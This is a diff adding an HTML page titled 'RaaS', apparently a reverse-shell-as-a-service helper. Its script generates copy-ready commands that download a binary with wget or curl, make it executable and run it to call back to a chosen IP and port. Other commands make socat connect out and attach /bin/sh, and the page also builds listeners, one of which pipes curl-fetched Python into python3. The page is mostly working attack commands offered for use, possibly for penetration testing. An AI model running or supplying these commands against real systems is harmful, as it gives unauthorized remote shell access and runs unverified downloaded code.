@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RaaS</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            background-color: #f7f7f7;
+            color: #333;
+            margin: 0;
+            padding: 0;
+        }
+        .container {
+            margin: 50px auto;
+            padding: 20px;
+            max-width: 800px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            text-align: center;
+            font-weight: 500;
+        }
+        input, button {
+            padding: 10px;
+            margin-right: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+        }
+        input {
+            width: 120px;
+            margin-bottom: 20px;
+        }
+        #ipInput, #portInput, #binaryInput, #filepathInput {
+            width: 100px;
+        }
+        button {
+            background-color: #007bff;
+            color: white;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        button:hover {
+            background-color: #0056b3;
+        }
+        .command-container {
+            display: flex;
+            align-items: center;
+            margin-top: 20px;
+        }
+        code {
+            display: block;
+            background-color: #eaeaea;
+            padding: 12px;
+            font-family: monospace;
+            width: 100%;
+            border-radius: 4px;
+            word-wrap: break-word;
+        }
+        h2 {
+            font-weight: 500;
+            margin-bottom: 15px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>RaaS</h1>
+    <label for="ipInput">IP:</label>
+    <input type="text" id="ipInput" placeholder="IP" value="127.0.0.1" oninput="updateCommand()" />
+    <label for="portInput">Port:</label>
+    <input type="text" id="portInput" placeholder="Port" value="31415" oninput="updateCommand()" />
+    <label for="binaryInput">Binary:</label>
+    <input type="text" id="binaryInput" placeholder="Binary" value="reverse" oninput="updateCommand()" />
+    <label for="filepathInput">File Path:</label>
+    <input type="text" id="filepathInput" placeholder="File Path" value="r" oninput="updateCommand()" />
+    
+    <h2>Launch Reverse Shell</h2>
+    <div class="command-container">
+        <button onclick="copyCommand('wget')">Copy</button>
+        <code id="wgetCommandBlock"></code>
+    </div>
+    <div class="command-container">
+        <button onclick="copyCommand('curl')">Copy</button>
+        <code id="curlCommandBlock"></code>
+    </div>
+    <div class="command-container">
+        <button onclick="copyCommand('socat')">Copy</button>
+        <code id="socatCommandBlock"></code>
+    </div>
+
+    <h2>Wait For Reverse Shell</h2>
+    <div class="command-container">
+        <button onclick="copyCommand('python')">Copy</button>
+        <code id="pythonCommandBlock"></code>
+    </div>
+    <div class="command-container">
+        <button onclick="copyCommand('rsm')">Copy</button>
+        <code id="rsmCommandBlock"></code>
+    </div>
+    <div class="command-container">
+        <button onclick="copyCommand('socat2')">Copy</button>
+        <code id="socat2CommandBlock"></code>
+    </div>
+</div>
+
+<script>
+    window.onload = function() {
+        if (localStorage.getItem('rs-ip')) {
+            document.getElementById('ipInput').value = localStorage.getItem('rs-ip');
+        }
+        if (localStorage.getItem('rs-port')) {
+            document.getElementById('portInput').value = localStorage.getItem('rs-port');
+        }
+        if (localStorage.getItem('rs-binary')) {
+            document.getElementById('binaryInput').value = localStorage.getItem('rs-binary');
+        }
+        if (localStorage.getItem('rs-filepath')) {
+            document.getElementById('filepathInput').value = localStorage.getItem('rs-filepath');
+        }
+        updateCommand();
+    };
+
+    function updateCommand() {
+        const ipDefault = "127.0.0.1";
+        const portDefault = "31415";
+        const binaryDefault = "reverse";
+        const filepathDefault = "r";
+
+        const ip = document.getElementById('ipInput').value || ipDefault;
+        const port = document.getElementById('portInput').value || portDefault;
+        const binary = document.getElementById('binaryInput').value || binaryDefault;
+        const filepath = document.getElementById('filepathInput').value || filepathDefault;
+
+        localStorage.setItem('rs-ip', ip);
+        localStorage.setItem('rs-port', port);
+        localStorage.setItem('rs-binary', binary);
+        localStorage.setItem('rs-filepath', filepath);
+
+        const argv0 = filepath.startsWith('/') ? filepath : `./${filepath}`;
+
+        const baseUrl = window.location.origin + window.location.pathname.replace(/\/[^/]*$/, '/');
+        const wgetCommand = `wget -qO ${filepath} ${baseUrl}${binary} && chmod +x ${filepath} && ${argv0} ${ip || ipDefault} ${port}`;
+        const curlCommand = `curl -so ${filepath} ${baseUrl}${binary} && chmod +x ${filepath} && ${argv0} ${ip || ipDefault} ${port}`;
+        const socatCommand = `socat tcp-connect:${ip}:${port} exec:/bin/sh,pty,stderr,setsid,sigint,sane`;
+        const pythonCommand = `python3 -c "$(curl -s ${baseUrl}server.py)" ${port}`;
+        const rsmCommand = `wget -qO rsm.py ${baseUrl}rsm.py && python3 ./rsm.py tmux ${port} --tty`;
+        const socat2Command = `socat file:\`tty\`,raw,echo=0 tcp-listen:${port}`;
+
+        document.getElementById('wgetCommandBlock').textContent = wgetCommand;
+        document.getElementById('curlCommandBlock').textContent = curlCommand;
+        document.getElementById('socatCommandBlock').textContent = socatCommand;
+        document.getElementById('pythonCommandBlock').textContent = pythonCommand;
+        document.getElementById('rsmCommandBlock').textContent = rsmCommand;
+        document.getElementById('socat2CommandBlock').textContent = socat2Command;
+    }
+
+    function copyCommand(type) {
+        const commandBlock = document.getElementById(`${type}CommandBlock`);
+        if (!commandBlock) {
+            alert('Command block not found!');
+            return;
+        }
+        
+        const command = commandBlock.textContent;
+
+        // Attempt to copy to clipboard
+        if (navigator.clipboard && navigator.clipboard.writeText) {
+            navigator.clipboard.writeText(command).then(function() {
+                // alert('Command copied to clipboard!');
+            }).catch(function(err) {
+                console.error('Could not copy text: ', err);
+                fallbackCopyText(commandBlock);
+            });
+        } else {
+            // Fallback for unsupported browsers
+            fallbackCopyText(commandBlock);
+        }
+    }
+
+    // Fallback method for copying text
+    function fallbackCopyText(commandBlock) {
+        const range = document.createRange();
+        range.selectNode(commandBlock);
+        window.getSelection().removeAllRanges(); // Clear any existing selections
+        window.getSelection().addRange(range); // Select the command
+        try {
+            const successful = document.execCommand('copy');
+            if (successful) {
+                // alert('Command copied to clipboard!');
+            } else {
+                alert('Copy failed. Please copy manually.');
+            }
+        } catch (err) {
+            console.error('Fallback: Oops, unable to copy', err);
+            alert('Copy failed. Please copy manually.');
+        }
+        window.getSelection().removeAllRanges(); // Clear the selection
+    }
+</script>
+
+</body>
+</html>
